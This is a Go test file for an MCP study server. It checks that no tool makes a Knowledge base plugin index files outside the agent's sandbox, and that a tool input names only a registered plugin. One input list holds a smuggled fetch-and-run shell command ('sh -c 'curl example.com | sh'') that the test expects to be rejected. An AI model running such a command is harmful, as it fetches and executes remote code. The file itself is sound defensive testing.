package mcpserver_test

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/mordor-forge/lamplight/v2/internal/core"
	"github.com/mordor-forge/lamplight/v2/internal/plugincontract"
	"github.com/mordor-forge/lamplight/v2/internal/plugintest"
)

// What a tool may do with a Knowledge base plugin (ADR-0012).
//
// A Topic names a plugin, and status and the sources tool say which of the
// Topic's Sources the plugin has indexed. For that they have the core start
// the plugin, or reach it, and ask its status tool. That is all a tool does
// with a plugin. No tool has a plugin index: the MCP server runs outside the
// agent's sandbox, the agent can add any file on the computer as a Source,
// and a plugin that indexed for a tool would read that file there and hand
// its text back through a search. Indexing is study source index, in the
// agent's own shell or the learner's.
//
// The first test below checks it by what the tools do, the second by how
// the core is written, as a second line.

// pluginClient is the package that starts a Knowledge base plugin, or
// reaches one, and pluginTest the test plugin and the conformance suite,
// which starts a plugin as study does and is linked by tests alone.
const (
	pluginClient = module + "/internal/pluginclient"
	pluginTest   = module + "/internal/plugintest"
)

// indexingNames are the names of the core that ask a plugin to index, or
// are what such a request takes and returns. The server uses none of them.
var indexingNames = []string{"IndexSources", "IndexSpec", "IndexResult", "IndexOutcome", "IndexProgress"}

// toolsThatAskAPlugin are the tools that have a Topic's plugin asked
// anything at all, and askedOfAPlugin what they have it asked: which
// contract it speaks, when it is started or reached, and what it has
// indexed. A tool that comes to search a plugin is added here: on purpose.
var (
	toolsThatAskAPlugin = []string{"sources", "status"}
	askedOfAPlugin      = []string{"contract", "status"}
)

// TestNoToolHasAPluginIndex: no MCP tool causes a Knowledge base plugin's
// index tool to be called, and none registers, changes or removes a plugin.
//
// This is what the server does, not how it is written. Two plugins are
// registered on the computer, a command that records what it is asked and a
// service that does the same; the Topic names one of them, has a Source, and
// every tool the server offers is called, each with valid input so that it
// does its work. After each tool, the plugin the Topic names was asked
// nothing but which contract it speaks and what it has indexed, the other
// was not started or reached at all, and the registry is byte for byte what
// it was. However a tool came to have a plugin index, through whatever
// function and under whatever name, it would show here.
//
// It also says which tools ask a plugin anything: status and sources, and
// no other. Adding a Source asks it nothing, and so does opening a Session.
func TestNoToolHasAPluginIndex(t *testing.T) {
	for _, named := range []string{"kb", "remote"} {
		t.Run("a Topic that names "+named, func(t *testing.T) {
			c := plugintest.NewComputer(t)
			record := filepath.Join(t.TempDir(), "record.json")
			c.Register(t, "kb", plugintest.Command("--record", record)...)
			var mu sync.Mutex
			var reached []plugintest.Call
			service := plugintest.New(plugintest.Config{Folder: t.TempDir(), Asked: func(tool string, args json.RawMessage) {
				mu.Lock()
				defer mu.Unlock()
				reached = append(reached, plugintest.Call{Tool: tool, Args: slices.Clone(args)})
			}})
			server := httptest.NewServer(service.Handler())
			t.Cleanup(func() {
				server.Close()
				service.Close()
			})
			c.RegisterURL(t, "remote", server.URL+"/mcp")
			registry := filepath.Join(c.ConfigDir, "knowledge-base-plugins.json")
			registered, err := os.ReadFile(registry)
			if err != nil {
				t.Fatal(err)
			}
			// asked are the calls each plugin received so far.
			asked := func() map[string][]plugintest.Call {
				mu.Lock()
				defer mu.Unlock()
				return map[string][]plugintest.Call{"kb": plugintest.ReadCalls(t, record), "remote": slices.Clone(reached)}
			}
			other := map[string]string{"kb": "remote", "remote": "kb"}[named]

			// The registry is one the core reads, with both plugins in it
			// and nothing wrong with either: a registry it refused would
			// have nothing started whatever the tools did.
			plugins := core.PluginOptions{Environ: func() []string { return c.Environ() }, StopGrace: 300 * time.Millisecond,
				GlanceTimeout: 20 * time.Second}
			k, err := core.Open(core.Options{Getenv: c.Getenv, Dir: c.Home, Plugins: plugins})
			if err != nil {
				t.Fatal(err)
			}
			list, err := k.Plugins(context.Background())
			if err != nil || len(list.Plugins) != 2 || list.Plugins[0].Problem != "" || list.Plugins[1].Problem != "" {
				t.Fatalf("the registry of this test = %+v, %v; want the two plugins, with nothing wrong", list, err)
			}

			asking := map[string]bool{}
			seen := 0
			after := func(tool string) {
				t.Helper()
				calls := asked()
				for _, call := range calls[named] {
					switch {
					case call.Tool == "index":
						t.Fatalf("calling %s had Knowledge base plugin %s index Source %s: no tool has a plugin index. The MCP "+
							"server runs outside the agent's sandbox, so a plugin that indexes for it reads any file the agent "+
							"named as a Source. Indexing is study source index (ADR-0012)", tool, named, call.Source())
					case !slices.Contains(askedOfAPlugin, call.Tool):
						t.Fatalf("calling %s asked Knowledge base plugin %s its %s tool: so far a tool asks a plugin which "+
							"contract it speaks and what it has indexed, and nothing else. If a tool is to ask this, say so in "+
							"askedOfAPlugin, on purpose (ADR-0012)", tool, named, call.Tool)
					}
				}
				if len(calls[other]) != 0 {
					t.Fatalf("calling %s asked Knowledge base plugin %s, which the Topic does not name, its %s tool", tool, other,
						calls[other][0].Tool)
				}
				if other == "kb" {
					if _, err := os.Stat(record); err == nil {
						t.Fatalf("calling %s started Knowledge base plugin kb, which the Topic does not name", tool)
					}
				}
				if len(calls[named]) > seen {
					asking[tool], seen = true, len(calls[named])
				}
				if now, err := os.ReadFile(registry); err != nil || !bytes.Equal(now, registered) {
					t.Fatalf("calling %s changed the Knowledge base plugin registry (%v): no tool registers, changes or removes "+
						"a plugin (ADR-0012). It is now:\n%s", tool, err, now)
				}
			}
			everyToolOn(t, c.Home, c.StudyHome, everyToolOptions{after: after, plugins: plugins,
				knowledgeBase: map[string]any{"kind": "plugin", "plugin": named}})

			// The tools that asked the plugin anything are the ones this
			// test expects: none comes to ask one unnoticed, and the ones
			// that should did, so the plugin was there to be asked.
			var tools []string
			for tool := range asking {
				tools = append(tools, tool)
			}
			sort.Strings(tools)
			if !slices.Equal(tools, toolsThatAskAPlugin) {
				t.Fatalf("the tools that asked the plugin anything are %v, want %v: say in toolsThatAskAPlugin which tools ask a "+
					"Knowledge base plugin, on purpose", tools, toolsThatAskAPlugin)
			}
			if got := plugintest.Tools(asked()[named]); !slices.Contains(got, "status") {
				t.Fatalf("the plugin was asked %v by the tools, and never what it has indexed, so this test proves nothing", got)
			}
			// Nothing a tool started is still running.
			if named == "kb" {
				if started := plugintest.ReadRecord(t, record); !plugintest.Gone(started.PID, 5*time.Second) {
					plugintest.Kill(started.PID)
					t.Errorf("a tool left the plugin, process %d, running", started.PID)
				}
			}

			// Every tool was called on a Topic with a Source the plugin
			// had not indexed: one was there from before the first call,
			// and it is still not indexed after the last.
			left, err := k.ListSources(context.Background(), "c")
			if err != nil || len(left.Sources) < 2 || left.Sources[0].Title != "Notes" || left.Sources[0].Indexed == nil ||
				left.Sources[0].Indexed.State != core.IndexNotIndexed {
				t.Fatalf("after every tool the Topic's Sources are %+v, %v; want the Source that was there from the start, not "+
					"indexed: without it a tool that had a plugin index would have had nothing to index", left.Sources, err)
			}

			// The record is real: indexing the one supported way has the
			// plugin index the Topic's Sources.
			res, err := k.IndexSources(context.Background(), core.IndexSpec{Topic: "c"})
			if err != nil || len(res.Sources) < 2 || !res.Sources[0].Asked {
				t.Fatalf("study source index c = %+v, %v", res, err)
			}
			if got := plugintest.Tools(asked()[named]); !slices.Contains(got, "index") {
				t.Fatalf("study source index left no record of the plugin indexing (%v), so this test proves nothing", got)
			}
		})
	}
}

// TestTheCoreAsksAPluginToIndexInOnePlace reads how the program is written,
// as a second line behind the test above: that one sees what the tools do
// with the input it gives them, and this one what the core could do at all.
//
// Only the core imports the package that starts a plugin, besides the test
// plugin, which nothing study is built from links. In the core, every use
// of that package is one this test knows, and the one function that starts
// a plugin is used in one place, startPlugin. startPlugin is used in three:
// CheckPlugin, which a tool cannot name; askPlugin, which asks a plugin
// what it has indexed and is what a tool reaches; and IndexSources.
//
// A plugin's index tool is asked in one function, askToIndex, which only
// indexSources uses, which only IndexSources uses, which nothing in the
// core uses and the server cannot name
// (TestTheServerNamesNothingThatChangesThePluginRegistry). So no operation
// a tool calls leads to it. It reads whole files, the declarations outside
// any function among them, and takes the package by whatever name a file
// imports it under.
func TestTheCoreAsksAPluginToIndexInOnePlace(t *testing.T) {
	var importers []string
	for _, line := range goList(t, "-f", `{{.ImportPath}} {{join .Imports ","}}`, "./...") {
		pkg, imports, _ := strings.Cut(line, " ")
		if slices.Contains(strings.Split(imports, ","), pluginClient) {
			importers = append(importers, strings.TrimPrefix(pkg, module+"/"))
		}
	}
	if !slices.Equal(importers, []string{"internal/core", "internal/plugintest"}) {
		t.Fatalf("%s is imported by %v: only internal/core may start a Knowledge base plugin, and internal/plugintest "+
			"for the tests", pluginClient, importers)
	}
	// The test plugin, with the conformance suite that starts a plugin, is
	// for tests: nothing study is built from links it.
	for _, pkg := range []string{"./cmd/study", "./internal/mcpserver", "./internal/core", "./internal/cli"} {
		deps := goList(t, "-deps", pkg)
		if slices.Contains(deps, pluginTest) {
			t.Errorf("%s links %s, which starts programs for tests", pkg, pluginTest)
		}
		if !slices.Contains(deps, pluginClient) {
			t.Fatalf("go list -deps %s does not list %s, so this test proves nothing", pkg, pluginClient)
		}
	}

	files, err := filepath.Glob(filepath.Join("..", "core", "*.go"))
	if err != nil {
		t.Fatal(err)
	}
	var sources []coreSource
	for _, name := range files {
		if strings.HasSuffix(name, "_test.go") {
			continue
		}
		data, err := os.ReadFile(name)
		if err != nil {
			t.Fatal(err)
		}
		sources = append(sources, coreSource{name, string(data)})
	}
	found, problems := pluginUses(t, sources)
	for _, problem := range problems {
		t.Error(problem)
	}
	// The core is read as this test expects: each is used where it may be,
	// as often as it may be.
	for name, want := range map[string]int{"Start": 1, "startPlugin": 3, "Index": 1, "Cancel": 2, "Search": 1, "Passage": 0,
		"askToIndex": 1, "indexSources": 1} {
		if found[name] != want {
			t.Errorf("%s is used %d times in the core, want %d: this test no longer reads the core as it is", name, found[name], want)
		}
	}
	for _, name := range []string{"CheckPlugin", "askPlugins"} {
		if !aboutTheRegistry(name) {
			t.Fatalf("the server could name %s, so this test proves nothing", name)
		}
	}
	if !slices.Contains(indexingNames, "IndexSources") {
		t.Fatal("the server could name IndexSources, so this test proves nothing")
	}

	// And it catches what it is for: each way a plugin could come to be
	// started, or to index, from elsewhere without this test noticing.
	const honest = `package core
import "github.com/mordor-forge/lamplight/v2/internal/pluginclient"
func (c *Core) CheckPlugin() { c.startPlugin() }
func (c *Core) askPlugin() { conn, _ := c.startPlugin(); conn.Status(nil, "c") }
func (c *Core) IndexSources() { conn, _ := c.startPlugin(); (&indexRun{conn: conn}).indexSources() }
func (r *indexRun) indexSources() { r.askToIndex() }
func (r *indexRun) askToIndex() { r.conn.Index(nil, "c", plugincontract.Source{}) }
func (r *indexRun) ended() { r.conn.Cancel(nil, "c", "s") }
func (c *Core) SearchLibrary() { ix.Search("q", 5) }
func (c *Core) startPlugin() (*pluginclient.Connection, error) {
	return pluginclient.Start(nil, pluginregistry.Env{}, pluginregistry.Plugin{}, pluginclient.Options{})
}
func (l *locator) library() *library.Index { return l.index }
`
	if _, problems := pluginUses(t, []coreSource{{"honest.go", honest}}); len(problems) != 0 {
		t.Fatalf("the core as it should be is refused: %v", problems)
	}
	for what, source := range map[string]string{
		"what a tool reaches asks the plugin to index": `package core
func (c *Core) askPlugins() { conn.Index(nil, "c", plugincontract.Source{}) }
`,
		"an operation a tool calls asks the plugin to index": `package core
func (c *Core) ListSources() { conn, _ := c.plugin(); conn.Index(nil, "c", plugincontract.Source{}) }
`,
		"the plugin's index tool is taken as a value": `package core
func (c *Core) Status() { index := conn.Index; index(nil, "c", plugincontract.Source{}) }
`,
		"the plugin's index tool is asked through an interface": `package core
type indexer interface{ Index(ctx context.Context, collection string, source plugincontract.Source) }
func (c *Core) Status() { indexer(conn).Index(nil, "c", plugincontract.Source{}) }
`,
		"what a tool reaches tells the plugin to stop indexing": `package core
func (c *Core) askPlugin() { conn.Cancel(nil, "c", "s") }
`,
		"an operation a tool calls searches the plugin": `package core
func (c *Core) ListEvidence() { conn.Search(nil, "c", "q", 5, nil) }
`,
		"an operation a tool calls reads a Passage of the plugin": `package core
func (c *Core) RecordEvidence() { conn.Passage(nil, "c", "p") }
`,
		"a method of the same name on another type asks the plugin to index": `package core
type sly struct{}
func (sly) askToIndex() { conn.Index(nil, "c", plugincontract.Source{}) }
func (c *Core) Status() { sly{}.askToIndex() }
`,
		"the plugin's index tool is called by a name made at run time": `package core
import "reflect"
func (c *Core) Status() { reflect.ValueOf(conn).MethodByName("Ind" + "ex").Call(nil) }
`,
		"another operation calls IndexSources": `package core
func (c *Core) AddSource() { c.IndexSources(nil, IndexSpec{Topic: "c"}) }
`,
		"IndexSources is taken as a value": `package core
func (c *Core) AddSource() { index := c.IndexSources; index(nil, IndexSpec{Topic: "c"}) }
`,
		"another function has a Source indexed": `package core
func (c *Core) AddSource() { (&indexRun{}).askToIndex() }
`,
		"another function runs the indexing": `package core
func (c *Core) AddSource() { (&indexRun{}).indexSources() }
`,
		"another operation calls CheckPlugin": `package core
func (c *Core) Status() { c.CheckPlugin(nil, "kb") }
`,
		"CheckPlugin is taken as a value": `package core
func (c *Core) Status() { check := c.CheckPlugin; check(nil, "kb") }
`,
		"the package under another name": `package core
import pc "github.com/mordor-forge/lamplight/v2/internal/pluginclient"
func (c *Core) Status() { pc.Start(nil, pluginregistry.Env{}, pluginregistry.Plugin{}, pc.Options{}) }
`,
		"the package under no name": `package core
import . "github.com/mordor-forge/lamplight/v2/internal/pluginclient"
func (c *Core) Status() { Start(nil, pluginregistry.Env{}, pluginregistry.Plugin{}, Options{}) }
`,
		"a variable of the package holds the function": `package core
import "github.com/mordor-forge/lamplight/v2/internal/pluginclient"
var begin = pluginclient.Start
func (c *Core) Status() { begin(nil, pluginregistry.Env{}, pluginregistry.Plugin{}, pluginclient.Options{}) }
`,
		"the function that starts a command alone": `package core
import "github.com/mordor-forge/lamplight/v2/internal/pluginclient"
func (c *Core) Status() { pluginclient.StartCommand(pluginregistry.Env{}, pluginregistry.Plugin{}, pluginclient.Options{}) }
`,
		"a fourth function starts a plugin": `package core
func (c *Core) AddSource() { c.startPlugin(nil, pluginregistry.Plugin{}) }
`,
		"startPlugin is taken as a value": `package core
var start = (*Core).startPlugin
`,
		"a name of the package this test does not know": `package core
import "github.com/mordor-forge/lamplight/v2/internal/pluginclient"
func (c *Core) Status() { _ = pluginclient.Reach }
`,
	} {
		if _, problems := pluginUses(t, []coreSource{{"honest.go", honest}, {"sly.go", source}}); len(problems) == 0 {
			t.Errorf("%s, and this test does not notice:\n%s", what, source)
		}
	}
}

// coreSource is one source file of the core.
type coreSource struct{ name, text string }

// pluginClientNames are the names of the package that starts a plugin that
// the core may use, and the one function each may be used in: anywhere, when
// empty. A name that is not here is one this test was not taught.
var pluginClientNames = map[string]string{
	"Start":   "Core.startPlugin",
	"Options": "Core.startPlugin",
	// What a reading returns, and how an address is shown.
	"Connection": "",
	"Server":     "",
	"Address":    "",
	// An error of the client's, which says whether it is about one call.
	"Error": "",
	// How long a plugin has to start: a number, which starts nothing.
	"DefaultStartTimeout": "",
}

// usedOnlyIn are the names of the core that lead to a plugin being started
// or asked to index, and the functions each may be used in. CheckPlugin and
// IndexSources may be used nowhere in the core: they are for the command
// line, which names them, and the server cannot.
//
// A function is named with the type it is a method of: a method of the same
// name on another type is another function.
var usedOnlyIn = map[string][]string{
	"startPlugin":  {"Core.CheckPlugin", "Core.askPlugin", "Core.IndexSources"},
	"askToIndex":   {"indexRun.indexSources"},
	"indexSources": {"Core.IndexSources"},
	"CheckPlugin":  nil,
	"IndexSources": nil,
}

// askedOfAConnection are the methods of a Connection that ask a plugin for
// more than which contract it speaks and what it has indexed, and the
// functions of the core each may be called in. Index and Cancel are for
// study source index alone. No operation searches a plugin or reads a
// Passage of one yet: when one comes to, say here where, on purpose. The
// one Search the core has is the Library's, which is no plugin, and
// ownProcessGroup sets how a Check's program is stopped, which is no
// plugin's either.
var askedOfAConnection = map[string][]string{
	"Index":   {"indexRun.askToIndex"},
	"Cancel":  {"indexRun.ended", "ownProcessGroup"},
	"Search":  {"Core.SearchLibrary"},
	"Passage": nil,
}

// asksAPlugin reports whether a name is one of those methods.
func asksAPlugin(name string) bool {
	_, asks := askedOfAConnection[name]
	return asks
}

// notAPlugins are the packages of the core's imports that have such a name
// for what is no plugin's tool: the Library's index, and the contract's
// types, which ask nothing.
var notAPlugins = []string{"library", "plugincontract"}

// byNameAlone are the packages that call a function by a name this test
// cannot read: it reads the names the core writes down.
var byNameAlone = []string{"reflect", "unsafe", "plugin"}

// pluginUses reads source files of the core and returns how often each
// name that starts a plugin, or asks one to index, is used, and what is
// wrong: a use of one of them anywhere but where it may be.
func pluginUses(t *testing.T, sources []coreSource) (found map[string]int, problems []string) {
	t.Helper()
	found = map[string]int{}
	problem := func(format string, args ...any) { problems = append(problems, fmt.Sprintf(format, args...)) }
	for _, source := range sources {
		file, err := parser.ParseFile(token.NewFileSet(), source.name, source.text, parser.SkipObjectResolution)
		if err != nil {
			t.Fatal(err)
		}
		// The name the file knows the package by.
		local := ""
		for _, imp := range file.Imports {
			if path := strings.Trim(imp.Path.Value, `"`); slices.Contains(byNameAlone, path) {
				problem("%s imports %s: with it a function is called by a name this test cannot read, a plugin's index "+
					"tool among them. The core does without it", source.name, path)
			}
			if strings.Trim(imp.Path.Value, `"`) != pluginClient {
				continue
			}
			switch {
			case imp.Name == nil:
				local = "pluginclient"
			case imp.Name.Name == "." || imp.Name.Name == "_":
				problem("%s imports %s as %s: its names would be used without the package's, where this test cannot "+
					"tell them from the core's own", source.name, pluginClient, imp.Name.Name)
			default:
				local = imp.Name.Name
			}
		}
		for _, decl := range file.Decls {
			// The function a use is in, or none for a declaration outside
			// every function.
			in := ""
			if fn, ok := decl.(*ast.FuncDecl); ok {
				in = fn.Name.Name
				if fn.Recv != nil && len(fn.Recv.List) == 1 {
					in = receiverOf(fn.Recv.List[0].Type) + "." + in
				}
			}
			where := func() string {
				if in == "" {
					return source.name + ", outside any function,"
				}
				return source.name + ": " + in
			}
			ast.Inspect(decl, func(n ast.Node) bool {
				sel, ok := n.(*ast.SelectorExpr)
				if !ok {
					return true
				}
				pkg, _ := sel.X.(*ast.Ident)
				name := sel.Sel.Name
				switch may, guarded := usedOnlyIn[name]; {
				case local != "" && pkg != nil && pkg.Name == local:
					may, known := pluginClientNames[name]
					switch {
					case !known:
						problem("%s uses %s.%s, which this test does not know: say in pluginClientNames what it is, "+
							"and where it may be used", where(), local, name)
					case may != "" && in != may:
						problem("%s uses %s.%s, which starts a Knowledge base plugin: only %s may, so that every start "+
							"of a plugin is one this test knows (ADR-0012)", where(), local, name, may)
					}
					if name == "Start" {
						found["Start"]++
					}
				case asksAPlugin(name) && (pkg == nil || !slices.Contains(notAPlugins, pkg.Name)):
					// Whatever it is asked of: a Connection, or anything
					// that stands for one.
					found[name]++
					if !slices.Contains(askedOfAConnection[name], in) {
						problem("%s uses %s, which a Knowledge base plugin's Connection has: only %v may, so that no MCP tool "+
							"has a plugin index, or stop indexing, and none searches one unnoticed (ADR-0012)", where(), name,
							askedOfAConnection[name])
					}
				case guarded:
					found[name]++
					switch {
					case len(may) == 0:
						problem("%s uses %s: nothing in the core may, so that no operation an MCP tool calls starts a "+
							"Knowledge base plugin to check it or has one index (ADR-0012)", where(), name)
					case !slices.Contains(may, in):
						problem("%s uses %s: only %s may, so that no MCP tool has a Knowledge base plugin index "+
							"(ADR-0012)", where(), name, strings.Join(may, " and "))
					}
				}
				return true
			})
		}
	}
	return found, problems
}

// receiverOf is the name of the type a method is declared on.
func receiverOf(expr ast.Expr) string {
	switch x := expr.(type) {
	case *ast.StarExpr:
		return receiverOf(x.X)
	case *ast.IndexExpr:
		return receiverOf(x.X)
	case *ast.IndexListExpr:
		return receiverOf(x.X)
	case *ast.Ident:
		return x.Name
	}
	return "?"
}

// The client asks each of a plugin's tools in one method of a Connection,
// which is what the test above counts on: it reads the core for who calls
// Index and Cancel, and that says who has a plugin index only while no
// other method of a Connection asks for it. So each tool's name is used in
// the one method that is called after it, and nowhere is a tool named by a
// text of the client's own.
func TestTheClientAsksEachToolInOneMethod(t *testing.T) {
	files, err := filepath.Glob(filepath.Join("..", "pluginclient", "*.go"))
	if err != nil {
		t.Fatal(err)
	}
	only := map[string]string{"ToolIndex": "Connection.Index", "ToolStatus": "Connection.Status", "ToolCancel": "Connection.Cancel",
		"ToolSearch": "Connection.Search", "ToolPassage": "Connection.Passage"}
	found := map[string]int{}
	for _, name := range files {
		if strings.HasSuffix(name, "_test.go") {
			continue
		}
		file, err := parser.ParseFile(token.NewFileSet(), name, nil, parser.SkipObjectResolution)
		if err != nil {
			t.Fatal(err)
		}
		for _, decl := range file.Decls {
			in := ""
			if fn, ok := decl.(*ast.FuncDecl); ok {
				in = fn.Name.Name
				if fn.Recv != nil && len(fn.Recv.List) == 1 {
					in = receiverOf(fn.Recv.List[0].Type) + "." + in
				}
			}
			ast.Inspect(decl, func(n ast.Node) bool {
				switch x := n.(type) {
				case *ast.SelectorExpr:
					if may, guarded := only[x.Sel.Name]; guarded {
						found[x.Sel.Name]++
						if in != may {
							t.Errorf("%s: %s uses %s: only %s asks a plugin that tool, so that who has a plugin index is "+
								"whoever calls that method", name, in, x.Sel.Name, may)
						}
					}
				case *ast.BasicLit:
					if x.Kind == token.STRING && slices.Contains(plugincontract.Tools, strings.Trim(x.Value, "`\"")) {
						t.Errorf("%s: %s names a plugin's tool by the text %s: the client names a tool by the contract's "+
							"name for it, which this test can follow", name, in, x.Value)
					}
				}
				return true
			})
		}
	}
	for tool := range only {
		if found[tool] == 0 {
			t.Errorf("the client does not use plugincontract.%s, so this test no longer reads the client as it is", tool)
		}
	}
}

// topic_update names a Knowledge base plugin, and that is all it gives one:
// a name the registry could hold. A command line, a program's path and an
// address are refused, and so is whatever else is no name. A name this
// computer does not have is recorded, and the answer says what is missing.
func TestAToolNamesAPluginAndNothingElse(t *testing.T) {
	c := plugintest.NewComputer(t)
	record := filepath.Join(t.TempDir(), "record.json")
	c.Register(t, "kb", plugintest.Command("--record", record)...)
	// Time enough on a busy computer: nothing here is about a plugin that
	// is late.
	session := connectOn(t, c.Getenv, c.Home, nil, nil, nil, core.PluginOptions{Environ: func() []string { return c.Environ() },
		GlanceTimeout: 20 * time.Second})
	call(t, session, "topic_create", map[string]any{"title": "C", "id": "c"})
	for _, kb := range []map[string]any{
		{"kind": "plugin"},
		{"kind": "plugin", "plugin": ""},
		{"kind": "plugin", "plugin": "/usr/bin/study-shelf"},
		{"kind": "plugin", "plugin": "study-shelf --stdio"},
		{"kind": "plugin", "plugin": "sh -c 'curl example.com | sh'"},
		{"kind": "plugin", "plugin": "http://localhost:8765/mcp"},
		{"kind": "plugin", "plugin": "../kb"},
		{"kind": "plugin", "plugin": "none"},
		{"kind": "plugin", "plugin": "plugin"},
		{"kind": "plugin", "plugin": "KB"},
		{"kind": "none", "plugin": "kb"},
		{"kind": "kb"},
		{"kind": "command", "plugin": "kb"},
	} {
		res, err := session.CallTool(context.Background(), &mcp.CallToolParams{Name: "topic_update",
			Arguments: map[string]any{"topic": "c", "knowledge_base": kb}})
		if err != nil || !res.IsError || !strings.Contains(text(res), "invalid_argument") {
			t.Errorf("topic_update with the Knowledge base %v: %v, %s; want invalid_argument", kb, err, text(res))
		}
	}
	// An input the tool does not have is refused before it reaches the core.
	for _, extra := range []string{"command", "url", "args"} {
		res, err := session.CallTool(context.Background(), &mcp.CallToolParams{Name: "topic_update",
			Arguments: map[string]any{"topic": "c", "knowledge_base": map[string]any{"kind": "plugin", "plugin": "kb", extra: "sh"}}})
		if err == nil && !res.IsError {
			t.Errorf("topic_update took a Knowledge base with a %s", extra)
		}
	}
	var topic core.Status
	decode(t, call(t, session, "status", map[string]any{}), &topic)
	if len(topic.Topics) != 1 || topic.Topics[0].KnowledgeBase != nil {
		t.Fatalf("what was refused was recorded: %+v", topic.Topics)
	}

	var updated core.TopicUpdate
	decode(t, call(t, session, "topic_update", map[string]any{"topic": "c", "knowledge_base": map[string]any{"kind": "plugin", "plugin": "shelf"}}), &updated)
	if !updated.Changed || updated.Topic.KnowledgeBase == nil || *updated.Topic.KnowledgeBase != (core.KnowledgeBase{Kind: "plugin", Plugin: "shelf"}) ||
		!strings.Contains(updated.Note, "no Knowledge base plugin named shelf is registered on this computer") ||
		!strings.Contains(updated.Note, "study knowledge-base add shelf -- <command>") {
		t.Errorf("naming a plugin this computer lacks = %+v, note %q", updated.Topic.KnowledgeBase, updated.Note)
	}
	var here core.TopicUpdate
	decode(t, call(t, session, "topic_update", map[string]any{"topic": "c", "knowledge_base": map[string]any{"kind": "plugin", "plugin": "kb"}}), &here)
	if !here.Changed || here.Topic.KnowledgeBase.Plugin != "kb" || here.Note != "" {
		t.Errorf("naming a plugin this computer has = %+v, note %q", here.Topic.KnowledgeBase, here.Note)
	}
	var none core.TopicUpdate
	decode(t, call(t, session, "topic_update", map[string]any{"topic": "c", "knowledge_base": map[string]any{"kind": "none"}}), &none)
	if !none.Changed || *none.Topic.KnowledgeBase != (core.KnowledgeBase{Kind: "none"}) || none.Note != "" {
		t.Errorf("going back to none = %+v, note %q", none.Topic.KnowledgeBase, none.Note)
	}
	// Naming a plugin started none.
	if _, err := os.Stat(record); err == nil {
		t.Error("naming a plugin started it")
	}
}

// The sources tool and status say, for a Topic that names a plugin, which
// Sources the plugin has indexed and the one command to run when some are
// not; and with a plugin that never answers they answer all the same, soon,
// with the Sources not known.
func TestToolsSayWhatIsIndexedAndNeverWait(t *testing.T) {
	c := plugintest.NewComputer(t)
	record := filepath.Join(t.TempDir(), "record.json")
	c.Register(t, "kb", plugintest.Command("--record", record)...)
	// A plugin that answers has the time to, on a computer that is busy.
	plugins := core.PluginOptions{Environ: func() []string { return c.Environ() }, StopGrace: 300 * time.Millisecond,
		GlanceTimeout: 20 * time.Second, IndexPoll: 10 * time.Millisecond}
	session := connectOn(t, c.Getenv, c.Home, nil, nil, nil, plugins)
	book := filepath.Join(c.Home, "Books", "book.txt")
	if err := os.MkdirAll(filepath.Dir(book), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(book, []byte("Elimination produces an upper triangular system.\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	call(t, session, "topic_create", map[string]any{"title": "C", "id": "c"})
	call(t, session, "topic_update", map[string]any{"topic": "c", "knowledge_base": map[string]any{"kind": "plugin", "plugin": "kb"}})
	var added core.SourceResult
	decode(t, call(t, session, "source_add", map[string]any{"topic": "c", "file": book}), &added)

	var list core.SourceList
	decode(t, call(t, session, "sources", map[string]any{"topic": "c"}), &list)
	if list.Indexing == nil || list.Indexing.Plugin != "kb" || list.Indexing.Problem != "" || list.Indexing.Action != "study source index c" ||
		len(list.Sources) != 1 || list.Sources[0].Indexed == nil || list.Sources[0].Indexed.State != core.IndexNotIndexed {
		t.Fatalf("sources = %+v, %+v", list.Indexing, list.Sources)
	}
	// Indexed the one way there is, in a shell.
	k, err := core.Open(core.Options{Getenv: c.Getenv, Dir: c.Home, Plugins: plugins})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := k.IndexSources(context.Background(), core.IndexSpec{Topic: "c"}); err != nil {
		t.Fatal(err)
	}
	var status core.Status
	decode(t, call(t, session, "status", map[string]any{}), &status)
	want := &core.Indexing{Plugin: "kb", Sources: []core.IndexedSource{{ID: added.Source.ID, Title: added.Source.Title,
		SourceIndex: core.SourceIndex{State: core.IndexIndexed}}}}
	if got := status.Topics[0].Indexing; got == nil || got.Plugin != want.Plugin || got.Action != "" || got.Problem != "" ||
		!slices.Equal(got.Sources, want.Sources) {
		t.Errorf("status = %+v, want %+v", got, want)
	}

	// The plugin stops answering: the tools do not. A server whose plugins
	// have half a second to say what is indexed, and thirty to start when
	// they are asked to index, answers long before a plugin would be given
	// up on there.
	c.Register(t, "kb", plugintest.Command("--record", record, "--hang", "start")...)
	// Opening a Session asks no plugin anything: with twenty seconds for the
	// plugin to answer, it is there at once, and the plugin was not started.
	last, _ := os.ReadFile(record)
	began := time.Now()
	call(t, session, "session_open", map[string]any{"topic": "c"})
	if now, _ := os.ReadFile(record); !bytes.Equal(now, last) || time.Since(began) > 10*time.Second {
		t.Errorf("session_open started the Topic's plugin, or waited %s for it", time.Since(began))
	}
	plugins.GlanceTimeout, plugins.StartTimeout = 500*time.Millisecond, 30*time.Second
	impatient := connectOn(t, c.Getenv, c.Home, nil, nil, nil, plugins)
	for _, tool := range []string{"sources", "status"} {
		args := map[string]any{"topic": "c"}
		if tool == "status" {
			args = map[string]any{}
		}
		began := time.Now()
		res := call(t, impatient, tool, args)
		if took := time.Since(began); took > 10*time.Second {
			t.Errorf("%s took %s with a plugin that never answers", tool, took)
		}
		var indexing *core.Indexing
		if tool == "sources" {
			var silent core.SourceList
			decode(t, res, &silent)
			indexing = silent.Indexing
			if silent.Sources[0].Indexed == nil || silent.Sources[0].Indexed.State != core.IndexUnknown || silent.Sources[0].Path != book {
				t.Errorf("sources with a plugin that never answers = %+v", silent.Sources[0])
			}
		} else {
			var silent core.Status
			decode(t, res, &silent)
			indexing = silent.Topics[0].Indexing
			if silent.Recommended == nil {
				t.Errorf("status with a plugin that never answers recommends nothing: %+v", silent)
			}
		}
		if indexing == nil || !strings.Contains(indexing.Problem, "did not say what it has indexed within 500ms") ||
			indexing.Action != "study knowledge-base check kb" {
			t.Errorf("%s with a plugin that never answers = %+v", tool, indexing)
		}
	}
	if started := plugintest.ReadRecord(t, record); !plugintest.Gone(started.PID, 5*time.Second) {
		plugintest.Kill(started.PID)
		t.Errorf("a tool left the plugin, process %d, running", started.PID)
	}
}
